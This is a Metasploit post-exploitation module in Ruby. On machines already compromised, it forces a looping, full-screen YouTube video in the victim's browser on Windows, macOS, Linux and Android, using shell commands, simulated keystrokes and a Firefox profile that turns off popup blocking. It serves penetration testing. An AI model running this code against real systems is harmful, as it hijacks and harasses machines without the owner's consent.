##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  PLAY_OPTIONS = 'autoplay=1&loop=1&disablekb=1&modestbranding=1&iv_load_policy=3&controls=0&showinfo=0&rel=0'

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Multi Manage YouTube Broadcast',
      'Description'   => %q{
        This module will broadcast a YouTube video on specified compromised systems. It will play
        the video in the target machine's native browser in full screen mode. The VID datastore
        option is the "v" parameter in a YouTube video's URL.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'sinn3r'],
      'Platform'      => [ 'win', 'osx', 'linux', 'android' ],
      'SessionTypes'  => [ 'shell', 'meterpreter' ]
    ))

    register_options(
      [
        OptString.new('VID', [true, 'The video ID to the YouTube video'])
      ])
  end

  YOUTUBE_BASE_URL = "https://youtube.com/embed/"

  #
  # The OSX version uses an apple script to do this
  #
  def osx_start_video(id)
    url = "#{YOUTUBE_BASE_URL}#{id}?#{PLAY_OPTIONS}"
    script = ''
    script << %Q|osascript -e 'tell application "Safari" to open location "#{url}"' |
    script << %Q|-e 'activate application "Safari"' |
    script << %Q|-e 'tell application "System Events" to key code {59, 55, 3}'|

    begin
      cmd_exec(script)
    rescue EOFError
      return false
    end

    true
  end

  #
  # The Windows version uses the "embed" player to make sure IE won't download the SWF as an object
  #
  def win_start_video(id)
    iexplore_path = "C:\\Program Files\\Internet Explorer\\iexplore.exe"
    begin
      session.sys.process.execute(iexplore_path, "-k #{YOUTUBE_BASE_URL}#{id}?#{PLAY_OPTIONS}")
    rescue Rex::Post::Meterpreter::RequestError
      return false
    end

    true
  end


  #
  # The Linux version uses Firefox
  # TODO: Try xdg-open?
  #
  def linux_start_video(id)
    begin
      # Create a profile
      profile_name = Rex::Text.rand_text_alpha(8)
      o = cmd_exec(%Q|firefox --display :0 -CreateProfile "#{profile_name} /tmp/#{profile_name}"|)

      # Add user-defined settings to profile
      s = %Q|
      user_pref("dom.disable_open_during_load", false);
      user_pref("browser.shell.checkDefaultBrowser", false);
      |
      write_file("/tmp/#{profile_name}/prefs.js", s)

      # Start the video
      url = "#{YOUTUBE_BASE_URL}#{id}?#{PLAY_OPTIONS}"
      data_js = %Q|"data:text/html,<script>window.open('#{url}','','width:100000px;height:100000px');</script>"|
      joe = "firefox --display :0 -p #{profile_name} #{data_js} &"
      cmd_exec("/bin/sh -c #{joe.shellescape}")
    rescue EOFError
      return false
    end

    true
  end

  #
  # The Android version is launched via an Intent
  #
  def android_start_video(id)
    intenturl = "intent://youtube.com/watch?v=#{id}&autoplay=1#Intent;scheme=http;action=android.intent.action.VIEW;end"
    begin
      session.android.activity_start(intenturl)
    rescue Rex::Post::Meterpreter::RequestError
      return false
    end
    true
  end

  def start_video(id)
    case session.platform
    when 'osx'
      osx_start_video(id)
    when 'windows'
      win_start_video(id)
    when 'linux'
      linux_start_video(id)
    when 'android'
      android_start_video(id)
    end
  end

  def run
    id = datastore['VID']

    print_status("#{peer} - Spawning video...")
    if start_video(id)
      print_good("#{peer} - The video has started")
    else
      print_error("#{peer} - Unable to start the video")
      return
    end

  end
end
